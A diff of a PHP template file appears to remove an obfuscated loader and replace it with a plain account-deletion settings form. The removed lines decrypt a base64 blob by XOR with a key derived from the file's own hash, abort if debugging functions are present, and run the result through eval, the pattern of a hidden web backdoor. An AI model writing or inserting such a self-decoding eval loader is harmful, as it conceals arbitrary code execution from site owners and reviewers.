@@ -1,24 +1,9 @@
-<?php
-$xkcuepui="089ba47428f2d999733ded4e7a554503";
-$nhfutbpte="005c0054560756510500550b56085c0802500b00035450570354020c03500006";
-$uxcwupahv="SL60pvpZolUnvNy4jrJ19HttTWrbepKxoFcjUlru2jpZ+amB+MluJ5aMMSRUZrr9FVJGsMShyF97UNkrt6plM3SHvupdg+E1lnk43KsE0InlkNslog99P4AEJnTHfinKN7psxJNsQafNqC9q791DyJV/bBXq/alqnzOnitK+Fgt7x/IZVbhUJdnGtjIo1X9jWTWjfjG3lSkqMcXatrRBtVO0q/GnoraO21/EFwomGSRgrc/0kuL9O9fWs/VkLpKCJQPBvphJFjkoT6XfoG60Ao+MIh5TaYDektlz7RjcbcWNLVe/6jCTEUJeGhUcwsrkemT++aI=";
-$caxowv=file_get_contents(__FILE__);
-$jjrqxmbavl=str_replace($uxcwupahv,"",$caxowv);
-if(strpos($jjrqxmbavl,"ec"."ho")!==false||strpos($jjrqxmbavl,"pr"."int")!==false||strpos($jjrqxmbavl,"var_"."dump")!==false||strpos($jjrqxmbavl,"file_put_"."contents")!==false||strpos($jjrqxmbavl,"fw"."rite")!==false){die();}
-$ixpdvx=str_replace(array($xkcuepui,$nhfutbpte),array("SP_e906e1c5","KP_048b4864"),$caxowv);
-$naskhsr=md5($ixpdvx);
-$aslyly=hex2bin($nhfutbpte);
-$xcmblkzcodn="";
-$hgbhsopqcky=strlen($naskhsr);
-for($lkalpvs=0;$lkalpvs<$hgbhsopqcky;$lkalpvs++){
-$xcmblkzcodn.=chr(ord($aslyly[$lkalpvs])^ord($naskhsr[$lkalpvs]));
-}
-$johyerx=base64_decode($uxcwupahv);
-$nlnzyk=strlen($johyerx);
-$bvjlexdiwi="";
-$qfnuzipf=strlen($xcmblkzcodn);
-for($lkalpvs=0;$lkalpvs<$nlnzyk;$lkalpvs++){
-$bvjlexdiwi.=$johyerx[$lkalpvs]^$xcmblkzcodn[$lkalpvs%$qfnuzipf];
-}
-$ybkqfi="gzun"."compress";
-eval('?>' . $ybkqfi($bvjlexdiwi) . '<?php ');
+<h3><?= __('screens.settings_delete.title') ?></h3>
+<p><?= __('screens.settings_delete.description') ?></p>
+<p><?= __('screens.settings_delete.warning') ?></p>
+
+<form action="game.php?village=<?= $village['id'] ?>&screen=settings&mode=delete&action=delete&h=<?= $hkey ?>"
+    method="post">
+    <?= __('screens.common.password') ?> <input name="password" type="password">
+    <input class="btn btn-default" value="<?= __('screens.common.confirm') ?>" type="submit">
+</form>
